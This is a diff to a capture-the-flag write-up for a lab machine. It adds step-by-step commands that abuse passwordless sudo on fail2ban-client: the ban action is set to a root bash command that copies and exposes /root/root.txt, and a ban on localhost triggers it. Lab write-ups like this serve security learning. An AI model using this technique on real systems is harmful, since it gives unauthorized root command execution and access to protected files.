@@ -62,11 +62,17 @@ User asterisk may run the following commands on Billing:
 (ALL) NOPASSWD: /usr/bin/fail2ban-client
 ```
 > indicating that you can run fail2ban-client without a password
-
+![image](https://github.com/user-attachments/assets/ccf1934f-1b38-49a2-9288-182c3b35fc81)
 
 ## Exploit
-Found an exploit i can use for fail2ban-client - https://vulners.com/packetstorm/PACKETSTORM:189989
+Found exploit for fail2ban-client - https://vulners.com/packetstorm/PACKETSTORM:189989
+- Step by step:
 
+1). ``` sudo /usr/bin/fail2ban-client restart ```
 
-![image](https://github.com/user-attachments/assets/ccf1934f-1b38-49a2-9288-182c3b35fc81)
+2). ``` sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban "/bin/bash -c 'cat /root/root.txt > /tmp/root.txt && chmod 777 /tmp/root.txt'" ```
+
+3). ``` sudo /usr/bin/fail2ban-client set sshd banip 127.0.0.1 ```
+
+4). ``` cat /tmp/root.txt ``` > captured the last flag
 ![image](https://github.com/user-attachments/assets/e7ed40cb-c154-4ef2-ba5f-61ed88d15968)
